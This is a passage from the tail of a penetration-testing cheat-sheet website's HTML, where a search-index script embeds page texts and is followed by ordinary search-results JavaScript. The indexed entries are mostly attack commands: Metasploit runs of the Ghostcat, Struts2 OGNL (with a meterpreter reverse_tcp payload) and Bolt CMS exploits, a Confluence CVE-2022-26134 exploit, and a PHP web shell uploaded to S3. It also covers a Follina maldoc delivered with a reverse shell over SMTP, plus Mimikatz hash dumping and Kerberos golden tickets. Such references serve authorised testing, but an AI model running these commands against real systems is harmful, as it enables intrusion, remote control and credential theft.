                content: "Enumeration link nmap --script ajp-auth -p 8009 nmap --script ajp-auth --script-args ajp-auth.path=/login -p 8009 nmap --script ajp-brute -p 8009 nmap --script ajp-headers -p 8009 nmap --script ajp-methods -p 8009 nmap --script ajp-request -p 8009 Ghostcat File Inclusion linkIts a vulnerability of Tomcat AJP (CVE-2020-1938).\nUse Metasploit for exploiting it.\nmsfconsole msf6 \u003e use auxiliary/admin/http/tomcat_ghostcat msf6 auxiliary(admin/http/tomcat_ghostcat) \u003e set rhosts msf6 auxiliary(admin/http/tomcat_ghostcat) \u003e exploit "
            }
        );
    index.add(
            {
                id:  286 ,
                href: "\/docs\/hdks\/web\/framework\/java\/apache-struts-pentesting\/",
                title: "Apache Struts Pentesting",
                description: "An open-source web application framework for developing Java EE web applications.",
                content: "Struts2 OGNL Elavasion linkMetasploit is useful for exploiting.\nmsfconsole msf \u003e use multi/http/struts2_content_type_ognl msf \u003e set payload linux/x86/meterpreter/reverse_tcp msf \u003e exploit meterpreter \u003e shell SHELL=/bin/bash script -q /dev/null "
            }
        );
    index.add(
            {
                id:  287 ,
                href: "\/docs\/hdks\/web\/atlassian-confluence-pentesting\/",
                title: "Atlassian Confluence Pentesting",
                description: "Atlassian Confluence is a collaboration wiki tool used to help teams to collaborate and share knowledge efficiently.",
                content: "Remote Code Execution (CVE-2022-26134) linkDownload the exploit from the repo.\npython3 exploit.py -u http:// -c whoami "
            }
        );
    index.add(
            {
                id:  288 ,
                href: "\/docs\/hdks\/web\/cloud\/aws-pentesting\/",
                title: "AWS (Amazon Web Services) Pentesting",
                description: "AWS (Amazon Web Services) provide on-demand cloud computing platforms and APIs to individuals, companies, and governments, on a metered pay-as-you-go basis.",
                content: "Amazon Resource Names (ARNs) link # Format arn:aws::::/ Identify and Access Management (IAM) link # Add credentials # This will add entries to .aws/config or .aws/credentials in user's home directory. # is arbitrary. aws configure --profile # List credentials aws configure list --profile # Find the account id belonging to an access key (access key starts with \"AKIA\") aws sts get-access-key-info --access-key-id AKIAQ31B... # Determin the username the access key you're using belogns to aws sts get-caller-identity --profile # List all EC2 instances running in an account aws ec2 describe-instances --output text --profile # List all EC2 instances running in an account in a dirrerent region aws ec2 describe-instances --output text --region us-east-1 --profile Amazon S3 linkA public cloud storage resource available in Amazon Web Services (AWS) Simple Storage Service (S3), an object storage offering.\nS3 Bucket URLs Commonly Used\nIf you find images in target website, open the images new tab and check the URLs if theyre stored in Amazon S3.\nThe following URLs templates are often used.\nhttp://example-assets.s3.amazonaws.com http://s3.amazonaws.com/example-assets/ http://example-www.s3.amazonaws.com http://s3.amazonaws.com/example-www/ http://example-public.s3.amazonaws.com http://s3.amazonaws.com/example-public/ http://example-private.s3.amazonaws.com http://s3.amazonaws.com/example-private/ http://example-bucket-zero.s3.amazonaws.com http://s3.amazonaws.com/example-bucket-zero/ http://example-bucket-one.s3.amazonaws.com http://s3.amazonaws.com/example-bucket-one/ http://example-bucket-two.s3.amazonaws.com http://s3.amazonaws.com/example-bucket-two/ XML Content Discovery\nAccessing the S3 Bucket URL, if the contents of XML,\n... creds.txt ... Retrieve the content by accessing to URL like https://vulnerable-assets.s3.amazonaws.com/creds.txt.\nAWS CLI\nFirst off, you may need to configure aws.\naws configure # http://.s3.amazonaws.com # List contents of a bucket aws s3 ls s3:/// aws s3 ls s3:/// --no-sign-request aws s3 ls s3://example.com # Specify the endpoint aws s3 --endpoint=http://example.com ls s3://example.com # Download files from s3 aws s3 cp s3:///example.xml . # Upload files to s3 aws s3 cp ./example.txt s3:// # -------------------------------------------------------------- # List all S3 buckets in the AWS account you've added. aws s3 ls --profile PROFILENAME Web Shell/Reverse Shell with CLI\nPrepare Web Shell\necho '\u003c?php system($_GET[\"cmd\"]); ?\u003e' \u003e shell.php Upload the Web Shell\naws s3 cp ./shell.php s3://example.com # or aws s3 --endpoint=http://s3.example.com cp ./shell.php s3://example.com Check if uploaded\naws s3 ls s3://example.com # or aws s3 --endpoint=http://s3.example.com ls s3://example.com Execute Commands via Request\nSend request to http://example.com/shell.php?cmd=whoami in browser or using curl.\nSecrets Manager link # List secrets aws secretsmanager list-secrets --profile # Get secret value # \"secret-id\" is the Name of the SecretList when run 'list-secrets'. aws secretsmanager get-secret-value --secret-id --profile # Help aws secretsmanager help Get Access Keys From Files link # Access Key ID starts with \"AKIA\" grep -e AKIA ./* "
            }
        );
    index.add(
            {
                id:  289 ,
                href: "\/docs\/hdks\/web\/cms\/bolt-cms-pentesting\/",
                title: "Bolt CMS Pentesting",
                description: "Bolt is an open-source content managemtn system based on PHP.",
                content: "Login Page link /bolt Remote Code Execution (v3.7.1) link msfconsole msf\u003e use exploit/unix/webapp/bolt_authenticated_rce msf\u003e set lhost msf\u003e set rhosts msf\u003e set username msf\u003e set password msf\u003e run "
            }
        );
    index.add(
            {
                id:  290 ,
                href: "\/docs\/hdks\/windows\/service\/microsoft-word-pentesting\/",
                title: "Microsoft Word Pentesting",
                description: "Follina MSDT (CVE-2022-30190) linkMicrosoft Support Diagnostic Tool (MSDT) is vulnerable with Follina.\n1. Download the Payload in Local Machine linkClone the payload from msdt-follina.\n2. Create the Maldoc in Local Machine link # -i: interface name python3 follina.py -i eth0 Then a new maldoc named follina.doc will be created in the current directory.\nNow youve started the web server.\n3. Open Another Web Server in Local Machine linkOpen another terminal and move to the msdt-follina directory, then start web server to transfer the maldoc to target machine.",
                content: "Follina MSDT (CVE-2022-30190) linkMicrosoft Support Diagnostic Tool (MSDT) is vulnerable with Follina.\n1. Download the Payload in Local Machine linkClone the payload from msdt-follina.\n2. Create the Maldoc in Local Machine link # -i: interface name python3 follina.py -i eth0 Then a new maldoc named follina.doc will be created in the current directory.\nNow youve started the web server.\n3. Open Another Web Server in Local Machine linkOpen another terminal and move to the msdt-follina directory, then start web server to transfer the maldoc to target machine.\npython3 -m http.server 3456 4. Transfer the Maldoc to Target Machine linkIn target Windows machine, open powershell and execute the following command.\ncd ~/Desktop curl http://:3456/follina.doc -o follina.docx 5. Open the Maldoc linkIn target machine, open the maldoc you transfered.\n.\\follina.docx 6. Check the Process Explorer of Sysinternals in Target Machine linkFind interesting processes in the Process Explorer.\n7. Check the Event Viewer in Target Machine to Detect Suspicious Processes link Go to View -\u003e Use Quick Filter\nA search bar should appear on top of the logs. Choose Find Event ID on the right of the search bar, and enter 4688(it means that a new process has been created) in a search bar.\nOpen the Find (Ctrl+F) and enter winword. Then check the contents of results.\nGo to Options  Advanced Options\nReverse Shell via SMTP\nIf the target uses SMTP, you may be able to reverse shell using it.\nStart the exploit to wait for reverse connections.\nsudo python3 follina.py -i tun0 -p 80 -r 4444 Send e-mail to the target machine via SMTP using swaks.\nswaks --to victim@vulnerable.com --from test@test --server mail.vulnerable.com --body \"http:///\" "
            }
        );
    index.add(
            {
                id:  291 ,
                href: "\/docs\/hdks\/windows\/privilege-escalation\/mimikatz\/",
                title: "Mimikatz",
                description: "Mimikatz is a password dumping tool for Windows. It also manages Kerberos tickets. Kiwi is the updated version of Mimikatz.",
                content: "You can download it from the GitHub repository.\nUsage link mimikatz Check if Mimikatz Running as an Administrator\nmimikatz # privilege::debug Elevate to SYSTEM Level\nmimikatz # token::elevate Dump Hashes\nmimikatz # lsadump::lsa /patch Security Identifier of the Kerberos Ticket Granting Ticket Account\nmimikatz # lsadump::lsa /inject /name:krbtgt All SAM Local Password Hashes\nmimikatz # lsadump::sam Credentials from the LSASS Memory\nmimikatz # sekurlsa::logonpasswords Create a Kerberos Golden Ticket\nmimikatz # kerberos::golden /user:Administrator /domain:sample.domain /sid :S-1-5-21-849420856-2351964222-986696166 /krbtgt:7808900312cc005cf7082a9a89eb dfdf /id:500 Open a New Command Prompt\nmimikatz # misc::cmd "
            }
        );
    index.add(
            {
                id:  292 ,
                href: "\/docs\/hdks\/web\/code-deobfuscation\/",
                title: "Code Deobfuscation",
                description: "This technique make a obfuscated code (such as JavaScript) to be understandable.",
                content: "Deobfuscation link JavaScript\nJavaScript Deobfuscator Obfuscation link JavaScript\nManual Obfuscation\nAccess https://obfuscator.io/.\nChange String Array Encoding to Base64.\nPaste JavaScript code.\nClick Obfuscate.\nTry running it on https://jsconsole.com/.\nUse Online Tools\nJSFuck\njjencode\naaencode\n"
            }
        );
    search.addEventListener('input', show_results, true);

    function show_results(){
        const maxResult =  5 ;
        const minlength =  0 ;
        var searchQuery = sanitizeHTML(this.value);
        var results = index.search(searchQuery, {limit: maxResult, enrich: true});

        
        const flatResults = new Map(); 
        for (const result of results.flatMap(r => r.result)) {
        if (flatResults.has(result.doc.href)) continue;
        flatResults.set(result.doc.href, result.doc);
        }

        suggestions.innerHTML = "";
        suggestions.classList.remove('d-none');

        
        if (searchQuery.length < minlength) {
            const minCharMessage = document.createElement('div')
            minCharMessage.innerHTML = `Please type at least <strong>${minlength}</strong> characters`
            minCharMessage.classList.add("suggestion__no-results");
            suggestions.appendChild(minCharMessage);
            return;
        } else {
            
            if (flatResults.size === 0 && searchQuery) {
                const noResultsMessage = document.createElement('div')
                noResultsMessage.innerHTML = "No results for" + ` "<strong>${searchQuery}</strong>"`
                noResultsMessage.classList.add("suggestion__no-results");
                suggestions.appendChild(noResultsMessage);
                return;
            }
        }

        
        for(const [href, doc] of flatResults) {
            const entry = document.createElement('div');
            suggestions.appendChild(entry);

            const a = document.createElement('a');
            a.href = href;
            entry.appendChild(a);

            const title = document.createElement('span');
            title.textContent = doc.title;
            title.classList.add("suggestion__title");
            a.appendChild(title);

            const description = document.createElement('span');
            description.textContent = doc.description;
            description.classList.add("suggestion__description");
            a.appendChild(description);

            suggestions.appendChild(entry);

            if(suggestions.childElementCount == maxResult) break;
        }
    }
    }());
</script>
        
    </body>
</html>